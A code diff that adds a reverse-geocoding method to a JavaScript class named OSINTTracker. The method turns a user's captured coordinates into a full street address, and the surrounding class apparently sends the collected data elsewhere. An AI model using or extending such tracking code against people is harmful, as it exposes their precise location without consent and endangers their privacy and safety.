@@ -304,6 +304,47 @@ class OSINTTracker {
             console.error('❌ Gagal kirim data:', error);
         }
     }
+    async reverseGeocode() {
+        try {
+            console.log('🔍 Reverse geocoding...');
+            
+            const response = await fetch(
+                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${this.userData.latitude}&lon=${this.userData.longitude}&zoom=18&addressdetails=1`,
+                {
+                    headers: {
+                        'User-Agent': 'OSINTTracker/1.0',
+                        'Accept-Language': 'id'
+                    }
+                }
+            );
+            
+            const data = await response.json();
+            
+            if (data && data.address) {
+                const addr = data.address;
+                
+                this.userData.country = addr.country || this.userData.country || 'Tidak diketahui';
+                this.userData.country_code = addr.country_code || this.userData.country_code || 'Tidak diketahui';
+                this.userData.province = addr.state || addr.province || 'Tidak diketahui';
+                this.userData.city = addr.city || addr.town || addr.village || this.userData.city || 'Tidak diketahui';
+                this.userData.district = addr.suburb || addr.neighbourhood || addr.district || 'Tidak diketahui';
+                this.userData.street = addr.road || addr.path || addr.street || 'Tidak diketahui';
+                this.userData.postal_code = addr.postcode || 'Tidak diketahui';
+                this.userData.full_address = data.display_name || 'Tidak diketahui';
+                
+                console.log('📍 ALAMAT LENGKAP:', {
+                    negara: this.userData.country,
+                    provinsi: this.userData.province,
+                    kota: this.userData.city,
+                    jalan: this.userData.street
+                });
+            }
+            
+        } catch (error) {
+            console.error('Reverse geocoding error:', error);
+            this.userData.full_address = 'Gagal mendapatkan alamat';
+        }
+    }
 }
 
 // Inisialisasi OSINT tracker
